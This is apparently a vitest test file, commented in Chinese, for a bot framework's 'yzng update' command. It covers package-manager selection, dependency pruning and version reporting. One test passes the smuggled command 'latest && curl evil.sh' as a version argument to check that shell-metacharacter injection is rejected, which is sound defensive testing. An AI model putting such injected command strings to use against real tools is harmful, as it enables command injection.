/**
 * 模块职责：`yzng update` 的行为测试
 * 依赖方向：测试文件
 * 生命周期：每个用例使用一个临时安装目录
 * 注意事项：断言集中在**下发了什么**而非「跑完之后目录里有什么」：真实的包管理器只能告诉你
 *          最后有一个 node_modules，而这条路会错的地方全在下发的那一行 —— 升的是哪个包、
 *          在哪个目录跑、选了哪个包管理器、根 package.json 有没有被剪对。故 `run` 被替换成
 *          一个记录调用的假实现。
 *
 *          「只升 cli 一个」这条尤其要守住：逐个升四个包会装出版本互不匹配的组合，
 *          而症状落在插件里（接口凭空缺字段），与「我升级过」相距很远。
 */
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { afterEach, beforeEach, describe, expect, it } from "vitest"
import { findInstallRoot } from "@yunzai-ng/core"
import {
  detectPackageManagers,
  diffVersions,
  pruneFrameworkDeps,
  readInstalled,
  runUpdateCommand,
  type UpdateRunner
} from "./update.js"

/** 一次被记录下来的包管理器调用 */
interface Call {
  /** 包管理器 */
  readonly pm: string
  /** 实参 */
  readonly args: readonly string[]
  /** 工作目录 */
  readonly cwd: string
}

describe("yzng update", () => {
  let root: string
  let calls: Call[]

  /** 记录调用并成功返回 */
  const ok: UpdateRunner = (pm, args, cwd) => {
    calls.push({ pm, args, cwd })
    return Promise.resolve()
  }

  /**
   * 写一份 package.json
   * @param dir 目录
   * @param pkg 内容
   */
  async function writePkg(dir: string, pkg: unknown): Promise<void> {
    await mkdir(dir, { recursive: true })
    await writeFile(join(dir, "package.json"), `${JSON.stringify(pkg, null, 2)}\n`, "utf8")
  }

  /**
   * 在 node_modules 里放一个包
   * @param name 包名
   * @param version 版本
   */
  async function install(name: string, version: string): Promise<void> {
    await writePkg(join(root, "node_modules", name), { name, version, exports: { "./package.json": "./package.json" } })
  }

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), "yzng-update-"))
    calls = []
  })

  afterEach(async () => {
    await rm(root, { recursive: true, force: true })
  })

  it("只对 @yunzai-ng/cli 下发一次升级 —— 另外三个由它的精确依赖带上来", async () => {
    await writePkg(root, { name: "我的机器人", dependencies: { "@yunzai-ng/cli": "^0.3.2" } })
    await writeFile(join(root, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n", "utf8")

    const code = await runUpdateCommand({ from: root, run: ok })
    expect(code).toBe(0)
    expect(calls).toHaveLength(1)
    expect(calls[0]?.args).toEqual(["add", "@yunzai-ng/cli@latest"])
    expect(calls[0]?.cwd).toBe(root)
  })

  it("剪掉 dependencies 里单列的 core —— 单列会把它锁在旧版本，使升级只动 cli 一个", async () => {
    await writePkg(root, {
      name: "我的机器人",
      dependencies: { "@yunzai-ng/cli": "^0.3.2", "@yunzai-ng/core": "0.4.0" }
    })

    await runUpdateCommand({ from: root, run: ok })

    const pkg = JSON.parse(await readFile(join(root, "package.json"), "utf8")) as {
      dependencies: Record<string, string>
    }
    expect(pkg.dependencies).toEqual({ "@yunzai-ng/cli": "^0.3.2" })
  })

  it("devDependencies 里的框架包一律保留 —— 那是本地写 TS 插件时给编译器用的", async () => {
    await writePkg(root, {
      name: "我的机器人",
      dependencies: { "@yunzai-ng/cli": "^0.3.2", "@yunzai-ng/core": "0.4.0" },
      devDependencies: { "@yunzai-ng/types": "0.3.0" }
    })

    const removed = await pruneFrameworkDeps(root)
    expect(removed).toEqual(["@yunzai-ng/core"])

    const pkg = JSON.parse(await readFile(join(root, "package.json"), "utf8")) as {
      devDependencies: Record<string, string>
    }
    expect(pkg.devDependencies).toEqual({ "@yunzai-ng/types": "0.3.0" })
  })

  it("--no-prune 时不动 package.json", async () => {
    const deps = { "@yunzai-ng/cli": "^0.3.2", "@yunzai-ng/core": "0.4.0" }
    await writePkg(root, { name: "我的机器人", dependencies: deps })

    await runUpdateCommand({ from: root, prune: false, run: ok })

    const pkg = JSON.parse(await readFile(join(root, "package.json"), "utf8")) as {
      dependencies: Record<string, string>
    }
    expect(pkg.dependencies).toEqual(deps)
  })

  it("保留原文的缩进 —— 重排整个文件会把真正那两行改动埋掉", async () => {
    const text = `{\n\t"name": "我的机器人",\n\t"dependencies": {\n\t\t"@yunzai-ng/cli": "^0.3.2",\n\t\t"@yunzai-ng/core": "0.4.0"\n\t}\n}\n`
    await mkdir(root, { recursive: true })
    await writeFile(join(root, "package.json"), text, "utf8")

    await pruneFrameworkDeps(root)

    const after = await readFile(join(root, "package.json"), "utf8")
    expect(after).toContain('\t"name"')
    expect(after.endsWith("\n")).toBe(true)
  })

  it("自子目录向上找到安装目录 —— 判据是声明了 cli，而非存在 node_modules", async () => {
    await writePkg(root, { name: "我的机器人", dependencies: { "@yunzai-ng/cli": "^0.3.2" } })
    const deep = join(root, "plugins", "某插件", "src")
    await mkdir(join(deep, "node_modules"), { recursive: true })

    expect(findInstallRoot(deep)).toBe(root)
  })

  it("找不到安装目录时退出码为 1，并指出全局安装该怎么办", async () => {
    const bare = await mkdtemp(join(tmpdir(), "yzng-bare-"))
    try {
      expect(await runUpdateCommand({ from: bare, run: ok })).toBe(1)
      expect(calls).toEqual([])
    } finally {
      await rm(bare, { recursive: true, force: true })
    }
  })

  it("拒绝含 shell 元字符的版本 —— Windows 上执行包管理器不得不带 shell", async () => {
    await writePkg(root, { name: "我的机器人", dependencies: { "@yunzai-ng/cli": "^0.3.2" } })

    expect(await runUpdateCommand({ from: root, to: "^0.4.0", run: ok })).toBe(1)
    expect(await runUpdateCommand({ from: root, to: "latest && curl evil.sh", run: ok })).toBe(1)
    expect(calls).toEqual([])
  })

  it("接受具体版本与预发布号", async () => {
    await writePkg(root, { name: "我的机器人", dependencies: { "@yunzai-ng/cli": "^0.3.2" } })
    await writeFile(join(root, "package-lock.json"), "{}\n", "utf8")

    expect(await runUpdateCommand({ from: root, to: "0.5.0-rc.1", run: ok })).toBe(0)
    expect(calls[0]?.args).toEqual(["install", "@yunzai-ng/cli@0.5.0-rc.1"])
  })

  it("按 lock 文件选包管理器 —— 在 pnpm 项目里跑 npm 会另建一套扁平 node_modules", async () => {
    await writePkg(root, { name: "我的机器人", dependencies: { "@yunzai-ng/cli": "^0.3.2" } })
    expect(await detectPackageManagers(root)).toEqual(["pnpm", "npm"])

    await writeFile(join(root, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n", "utf8")
    expect(await detectPackageManagers(root)).toEqual(["pnpm"])
  })

  it("pnpm 失败时退到 npm，两者都失败则退出码为 1 且带上各自原因", async () => {
    await writePkg(root, { name: "我的机器人", dependencies: { "@yunzai-ng/cli": "^0.3.2" } })

    const bothFail: UpdateRunner = (pm, args, cwd) => {
      calls.push({ pm, args, cwd })
      return Promise.reject(new Error(`${pm} 起不来`))
    }
    expect(await runUpdateCommand({ from: root, run: bothFail })).toBe(1)
    expect(calls.map(c => c.pm)).toEqual(["pnpm", "npm"])
  })

  it("以磁盘上那份 cli 为基准读版本 —— 本进程跑的是旧版，自 import.meta 解析必然读回旧的", async () => {
    await install("@yunzai-ng/cli", "0.4.0")
    await install("@yunzai-ng/core", "0.5.0")

    const found = await readInstalled(root)
    expect(found.get("@yunzai-ng/cli")).toBe("0.4.0")
    expect(found.get("@yunzai-ng/core")).toBe("0.5.0")
    // 未装到的包不出现，而非编造一个版本号
    expect(found.has("@yunzai-ng/jsx")).toBe(false)
  })

  it("未装 cli 时读不出任何版本", async () => {
    expect((await readInstalled(root)).size).toBe(0)
  })

  it("对照表覆盖四个包，缺装的一栏为 undefined", () => {
    const changes = diffVersions(new Map([["@yunzai-ng/cli", "0.3.2"]]), new Map([["@yunzai-ng/cli", "0.4.0"]]))
    expect(changes.map(c => c.name)).toEqual([
      "@yunzai-ng/cli",
      "@yunzai-ng/core",
      "@yunzai-ng/types",
      "@yunzai-ng/jsx"
    ])
    expect(changes[0]).toEqual({ name: "@yunzai-ng/cli", before: "0.3.2", after: "0.4.0" })
    expect(changes[1]?.after).toBeUndefined()
  })
})
